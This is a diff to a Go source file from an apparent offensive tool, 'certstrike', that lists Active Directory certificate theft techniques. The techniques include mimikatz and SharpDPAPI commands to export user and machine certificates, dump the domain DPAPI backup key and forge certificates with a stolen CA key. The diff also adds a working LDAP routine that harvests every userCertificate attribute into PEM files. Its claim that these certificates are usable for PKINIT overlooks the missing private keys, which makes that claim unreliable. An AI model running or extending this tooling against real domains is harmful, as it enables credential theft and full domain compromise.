@@ -1,6 +1,15 @@
 package pki
 
-import "fmt"
+import (
+	"crypto/x509"
+	"encoding/pem"
+	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
+
+	"github.com/go-ldap/ldap/v3"
+)
 
 // CertTheftMethod describes a certificate theft technique.
 type CertTheftMethod struct {
@@ -29,7 +38,7 @@ func GetCertTheftMethods() []CertTheftMethod {
 				"mimikatz # crypto::capi",
 				"mimikatz # crypto::certificates /export /store:MY",
 			},
-			Notes: "Requires access to the user's session. Works when keys are marked exportable.",
+			Notes:     "Windows-local technique. Requires access to the user's session. Run from the target host.",
 		},
 		{
 			Name:        "THEFT2 — DPAPI Machine Certificate Extraction",
@@ -44,7 +53,7 @@ func GetCertTheftMethods() []CertTheftMethod {
 				"mimikatz # lsadump::backupkeys /system:dc01.corp.local /export",
 				"SharpDPAPI.exe certificates /machine /mkfile:backup.key",
 			},
-			Notes: "Requires local administrator. DPAPI backup key from DC decrypts all machine certs in the domain.",
+			Notes:     "Windows-local technique. Requires local administrator. DPAPI backup key from DC decrypts all machine certs.",
 		},
 		{
 			Name:        "THEFT3 — DPAPI User Certificate Extraction",
@@ -58,21 +67,19 @@ func GetCertTheftMethods() []CertTheftMethod {
 				"# mimikatz",
 				"mimikatz # dpapi::capi /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\<SID>\\<container>\"",
 			},
-			Notes: "User DPAPI masterkeys are derived from the user's password. Domain backup key decrypts all user keys.",
+			Notes:     "Windows-local technique. User DPAPI masterkeys are derived from the user's password.",
 		},
 		{
-			Name:        "THEFT4 — NTDS.dit Certificate Extraction",
-			Description: "Extract certificates stored in Active Directory (NTDS.dit) including user certificate mappings.",
-			Tool:        "secretsdump.py / ntdsutil",
+			Name:        "THEFT4 — LDAP Certificate Extraction",
+			Description: "Extract userCertificate attributes from Active Directory via LDAP. Retrieves all certificates stored in AD user/computer objects.",
+			Tool:        "certstrike (built-in)",
 			Commands: []string{
-				"# Dump NTDS.dit (includes userCertificate attributes)",
-				"secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile dump LOCAL",
-				"# ntdsutil snapshot method",
-				"ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds\" quit quit",
-				"# Extract certificates from dump",
-				"python3 -c \"import ldap3; # parse userCertificate attributes from NTDS dump\"",
+				"# Extract all user certificates from AD",
+				"certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass",
+				"# Extract with LDAPS",
+				"certstrike pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass --ldaps",
 			},
-			Notes: "Requires domain admin or NTDS.dit access. Contains all user certificates stored in AD.",
+			Notes:     "Automated: CertStrike queries LDAP for userCertificate attributes and exports DER X.509 certs as PEM files.",
 		},
 		{
 			Name:        "THEFT5 — CA Private Key Extraction",
@@ -88,7 +95,7 @@ func GetCertTheftMethods() []CertTheftMethod {
 				"# Then use extracted CA key for golden cert:",
 				"certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt",
 			},
-			Notes: "The CA private key enables forging ANY certificate trusted by the domain. This is the PKI equivalent of a krbtgt key.",
+			Notes:     "Windows-local technique. The CA private key enables forging ANY certificate trusted by the domain.",
 		},
 	}
 }
@@ -128,6 +135,125 @@ func printMethod(m CertTheftMethod) {
 	}
 	fmt.Printf("\n    Note: %s\n\n", m.Notes)
 }
+
+// ────────────────────────────────────────────────────────────────────────────
+// THEFT4 — Real LDAP Certificate Extraction
+// ────────────────────────────────────────────────────────────────────────────
+
+// ExtractUserCertificatesLDAP queries Active Directory for userCertificate
+// attributes on all user and computer objects, parses the DER-encoded X.509
+// certificates, and writes them as PEM files to the output directory.
+//
+// This is the real implementation of THEFT4 — it actually connects to LDAP
+// and extracts certificates, rather than printing guidance commands.
+func ExtractUserCertificatesLDAP(cfg *ADCSConfig, outputDir string) (int, error) {
+	fmt.Println("[*] THEFT4: Extracting userCertificate attributes from AD via LDAP...")
+
+	conn, err := connectLDAP(cfg)
+	if err != nil {
+		return 0, fmt.Errorf("LDAP connect: %w", err)
+	}
+	defer conn.Close()
+
+	// Build base DN from domain
+	parts := strings.Split(cfg.Domain, ".")
+	var dcParts []string
+	for _, p := range parts {
+		dcParts = append(dcParts, "DC="+p)
+	}
+	baseDN := strings.Join(dcParts, ",")
+
+	// Search for all objects with userCertificate attribute
+	searchReq := ldap.NewSearchRequest(
+		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,
+		0, 0, false,
+		"(userCertificate=*)",
+		[]string{"sAMAccountName", "distinguishedName", "userCertificate", "objectClass"},
+		nil,
+	)
+
+	result, err := conn.SearchWithPaging(searchReq, 100)
+	if err != nil {
+		return 0, fmt.Errorf("LDAP search for userCertificate: %w", err)
+	}
+
+	if len(result.Entries) == 0 {
+		fmt.Println("[*] No objects with userCertificate attribute found")
+		return 0, nil
+	}
+
+	fmt.Printf("[+] Found %d object(s) with certificates\n", len(result.Entries))
+
+	if err := os.MkdirAll(outputDir, 0700); err != nil {
+		return 0, fmt.Errorf("create output dir: %w", err)
+	}
+
+	totalCerts := 0
+	for _, entry := range result.Entries {
+		sam := entry.GetAttributeValue("sAMAccountName")
+		if sam == "" {
+			sam = "unknown"
+		}
+
+		// userCertificate is a multi-valued binary attribute
+		certValues := entry.GetRawAttributeValues("userCertificate")
+		if len(certValues) == 0 {
+			continue
+		}
+
+		for i, certDER := range certValues {
+			cert, err := x509.ParseCertificate(certDER)
+			if err != nil {
+				fmt.Printf("[!] %s: certificate %d parse error: %v\n", sam, i, err)
+				continue
+			}
+
+			// Write as PEM
+			safeName := strings.ReplaceAll(sam, " ", "_")
+			safeName = strings.ReplaceAll(safeName, "/", "_")
+			fileName := fmt.Sprintf("%s_cert%d.pem", safeName, i)
+			pemPath := filepath.Join(outputDir, fileName)
+
+			pemFile, err := os.Create(pemPath)
+			if err != nil {
+				fmt.Printf("[!] %s: create file %s: %v\n", sam, pemPath, err)
+				continue
+			}
+
+			if err := pem.Encode(pemFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
+				pemFile.Close()
+				fmt.Printf("[!] %s: write PEM: %v\n", sam, err)
+				continue
+			}
+			pemFile.Close()
+
+			totalCerts++
+			fmt.Printf("[+] %s: CN=%s, Issuer=%s, Expires=%s → %s\n",
+				sam,
+				cert.Subject.CommonName,
+				cert.Issuer.CommonName,
+				cert.NotAfter.Format("2006-01-02"),
+				pemPath,
+			)
+
+			// Check for interesting EKUs
+			for _, eku := range cert.ExtKeyUsage {
+				switch eku {
+				case x509.ExtKeyUsageClientAuth:
+					fmt.Printf("    ⚠ Has Client Authentication EKU — usable for Kerberos PKINIT\n")
+				}
+			}
+		}
+	}
+
+	fmt.Printf("\n[+] THEFT4 complete: extracted %d certificate(s) from %d object(s) → %s\n",
+		totalCerts, len(result.Entries), outputDir)
+	return totalCerts, nil
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// Helpers
+// ────────────────────────────────────────────────────────────────────────────
 
 func containsIgnoreCase(s, substr string) bool {
 	return indexIgnoreCase(s, substr) >= 0
